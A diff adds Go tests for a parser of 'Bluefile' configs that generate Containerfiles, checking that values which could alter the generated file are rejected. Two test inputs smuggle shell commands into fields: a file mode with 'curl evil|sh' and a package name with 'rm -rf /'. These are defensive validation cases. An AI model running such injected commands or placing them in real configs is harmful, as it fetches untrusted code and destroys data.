@@ -80,6 +80,40 @@ func TestValidation(t *testing.T) {
 	}
 }
 
+// Values that would change the structure of the generated Containerfile are
+// rejected at parse time rather than escaped at render time.
+func TestGrammarValidation(t *testing.T) {
+	cases := map[string]string{
+		"newline in env value": "base: x\nenv:\n  A: \"one\\ntwo\"\n",
+		"bad env key":          "base: x\nenv:\n  \"a-b\": v\n",
+		"non-octal mode":       "base: docker.io/library/alpine\nblueprint:\n  write_files:\n    - path: /etc/x\n      content: y\n      mode: \"0755; curl evil|sh\"\n",
+		"user with space":      "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: \"a b\"\n",
+		"relative shell":       "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: a\n      shell: bash\n",
+		"package injection":    "base: x\npackages:\n  - \"jq; rm -rf /\"\n",
+		"base with space":      "base: \"a b\"\n",
+	}
+	for name, body := range cases {
+		p := write(t, body)
+		if _, err := Parse(p); err == nil {
+			t.Errorf("%s: expected error, got none", name)
+		}
+	}
+}
+
+// Everything shipped under examples/ must keep parsing as the validation
+// rules grow.
+func TestShippedExamplesStillParse(t *testing.T) {
+	matches, err := filepath.Glob("../../examples/*/Bluefile")
+	if err != nil || len(matches) == 0 {
+		t.Fatalf("no example Bluefiles found: %v", err)
+	}
+	for _, p := range matches {
+		if _, err := Parse(p); err != nil {
+			t.Errorf("%s: %v", p, err)
+		}
+	}
+}
+
 func TestPackageManagerSelection(t *testing.T) {
 	cases := []struct{ base, want string }{
 		{"docker.io/library/alpine:latest", "apk add --no-cache"},
